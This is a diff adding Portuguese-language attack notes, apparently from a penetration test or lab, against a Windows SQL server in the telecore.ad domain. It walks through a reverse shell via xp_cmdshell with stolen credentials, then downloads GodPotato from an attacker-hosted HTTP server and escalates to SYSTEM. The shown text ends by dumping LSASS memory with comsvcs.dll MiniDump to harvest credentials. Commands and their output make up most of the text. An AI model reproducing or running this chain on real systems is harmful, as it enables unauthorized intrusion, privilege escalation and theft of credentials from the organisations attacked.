@@ -1,0 +1,78 @@
+#+title: Mssql Access
+#+author: gabriel
+* HOLD intro
+após obter as credenciais do user tel_support01, foi possível verificar que elas são válidas no SQL-Srv.telecore.ad
+
+foi possível pegar um reverse shell com a opção ~xp_cmdshell~, usei um revershell em base64, do https://www.revshells.com
+
+Após obter este reverse shell, estamos com um user com poucos privs na máquina, com o GodPotato podemos escalar para nt authority -->
+#+begin_src sh
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+#+end_src
+
+servindo ele a partir da minha máquina -->
+#+begin_src sh
+python3 -m http.server 1666
+#+end_src
+
+pegando o .exe a partir do SQL server comprometido -->
+#+begin_src powershell
+iwr -UseBasicParsing http://10.10.40.118:1666/GodPotato-NET4.exe -OutFile GodPotato.exe
+#+end_src
+
+ao executar comandos com este executavel, o user que está sendo usado é o nt authority\system, basta pegar um novo reverse shell, que agora este shell vai ter um user com maiores privilégios -->
+#+begin_src powershell
+.\GodPotato.exe -cmd "cmd /c whoami"
+
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4472
+nt authority\system
+#+end_src
+
+* credential dumping
+após conseguir um shell com o nt authority\system, o foco será um dump do lsass.exe utilizando uma ferramenta nativa do windows, exitem diversas formas para este processo
+
+#+begin_src powershell
+PS C:\Users\Public> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeTcbPrivilege                  Act as part of the operating system       Enabled 
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeAuditPrivilege                Generate security audits                  Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
+#+end_src
+
+checando se o lsass.exe está em execução atualmente -->
+#+begin_src powershell
+PS C:\Users\Public> tasklist /fi "imagename eq lsass.exe"
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+lsass.exe                      688 Services                   0     19,788 K
+#+end_src
+
+function MiniDump do comsvcs.dll, para realizar uma cópia do lsass.exe -->
+#+begin_src powershell
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Public\lsass.dmp full
+#+end_src
+
+
